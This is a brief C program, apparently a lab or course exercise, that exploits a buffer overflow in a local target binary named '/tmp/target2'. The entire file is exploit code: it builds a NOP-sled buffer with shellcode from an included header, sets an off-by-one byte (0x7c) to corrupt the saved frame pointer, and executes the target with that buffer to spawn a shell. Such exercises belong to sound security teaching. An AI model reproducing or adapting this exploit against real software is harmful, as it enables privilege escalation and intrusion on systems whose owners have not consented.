#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"
#define NOP 0x90
int main(void)
{
  char *args[3];
  char *env[1];
  int i, j;
  char buffer[242];

  memset(buffer, NOP, sizeof(buffer));
  memcpy(buffer, shellcode, strlen(shellcode));
  buffer[240] = 0x7c;
  buffer[241] = '\0';

  args[0] = TARGET; args[1] = buffer; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
